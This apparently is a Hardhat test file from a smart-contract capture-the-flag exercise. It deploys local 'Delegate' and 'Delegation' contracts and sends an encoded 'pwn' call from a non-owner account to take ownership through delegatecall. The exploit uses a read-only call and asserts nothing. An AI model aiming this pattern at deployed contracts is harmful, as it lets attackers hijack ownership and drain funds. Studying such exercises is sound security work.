/* eslint-disable */
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, ContractFactory } from "ethers";
import hre from "hardhat";

let ethers = hre.ethers;

describe("Exploit", function () {
  let owner: SignerWithAddress,
    addr1: SignerWithAddress,
    addr2: SignerWithAddress,
    addr3: SignerWithAddress,
    other: SignerWithAddress[];

  let Delegate: ContractFactory;
  let delegateContract: Contract;

  let Delegation: ContractFactory;
  let delegationContract: Contract;

  before(async function () {
    [owner, addr1, addr2, addr3, ...other] = await ethers.getSigners();
    Delegate = await ethers.getContractFactory("Delegate");
    delegateContract = await Delegate.deploy(owner.address);
    await delegateContract.deployed();

    Delegation = await ethers.getContractFactory("Delegation");
    delegationContract = await Delegation.deploy(delegateContract.address);
    await delegationContract.deployed();
  });
  it("Check block number", async function () {
    const latestBlock = await hre.ethers.provider.getBlock("latest");
  });
  it("Exploit", async function () {
    let FUNC = "pwn";
    let VALUES: any[] = [];
    const data = delegateContract.interface.encodeFunctionData(FUNC, VALUES);

    const tx = await ethers.provider.call({
      from: addr1.address,
      to: delegationContract.address,
      data: data,
    });

    // console.log(owner.address, addr1.address);
    // console.log(await delegationContract.owner());
  });
});
